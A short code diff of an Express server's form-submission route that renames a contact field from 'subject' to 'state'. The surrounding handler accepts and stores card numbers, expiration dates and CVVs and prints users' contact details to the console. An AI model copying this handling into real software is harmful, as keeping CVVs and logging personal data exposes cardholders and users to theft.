@@ -35,7 +35,7 @@ let storage = [];
 
 // POST route for submissions
 app.post("/submit", (req, res) => {
-  const { name, email, phone, subject, message, cardNumber, expirationDate, cvv } = req.body;
+  const { name, email, phone, state, message, cardNumber, expirationDate, cvv } = req.body;
 
   if (
     typeof cardNumber === "string" &&
@@ -49,8 +49,8 @@ app.post("/submit", (req, res) => {
     return res.status(200).json({ message: "Payment data stored successfully" });
   }
 
-  if (name && email && phone && subject && message) {
-    storage.push({ name, email, phone, subject, message });
+  if (name && email && phone && state && message) {
+    storage.push({ name, email, phone, state, message });
     console.log("Stored Contact Info:", storage);
     return res.status(200).json({ message: "Contact data stored successfully" });
   }
